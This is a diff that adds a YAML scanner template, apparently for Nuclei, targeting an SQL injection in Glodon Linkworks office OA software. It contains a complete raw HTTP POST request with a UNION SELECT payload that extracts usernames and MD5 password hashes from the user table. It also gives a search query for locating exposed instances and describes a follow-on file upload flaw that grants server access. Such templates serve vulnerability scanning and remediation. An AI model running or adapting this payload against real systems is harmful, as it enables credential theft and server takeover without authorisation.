@@ -1,0 +1,36 @@
+id: LinkworksOA-SQL
+
+info:
+  name: LinkworksOA-SQL
+  author: hufei
+  severity: high
+  description: |
+    - 由于 广联达 Linkworks办公OA GetIMDictionary接口未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。
+    - 而msgbroadcastuploadfile.aspx接口处存在后台文件上传漏洞，攻击者通过SQL注入获取管理员md5的密码后，可以登陆发送请求包获取服务器权限。
+  reference:
+    https://blog.csdn.net/qq_41904294/article/details/132249902
+  metadata:
+    max-request: 1
+    fofa-query:
+    hunter-query: web.body="/Services/Identification/Server/"
+    verified: true
+  tags: 2023,HVV,LinkworksOA-SQL,SQL
+
+http:
+  - raw:
+      - |
+        POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+
+        key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
+
+    matchers:
+      - type: word
+        words:
+          - "admin:"
